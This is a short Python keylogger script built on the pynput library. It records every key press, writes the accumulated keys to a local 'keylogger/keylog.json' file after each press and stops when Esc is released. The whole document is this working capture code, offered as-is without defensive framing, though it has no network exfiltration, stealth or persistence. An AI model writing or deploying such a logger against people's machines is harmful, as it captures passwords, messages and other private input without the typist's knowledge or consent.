import json
from pynput.keyboard import Key, Listener

pressed_keys = []


def key_pressed(key):
    pressed_keys.append(str(key))
    store_keys_to_file(pressed_keys)


def store_keys_to_file(keys):
    with open('keylogger/keylog.json', 'w') as log:

        for key in keys:
            key = str(key).replace("'", " ")
            # log.write(key)
            json.dump(key, log)


def on_key_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=key_pressed, on_release=on_key_release) as listener:
    listener.join()
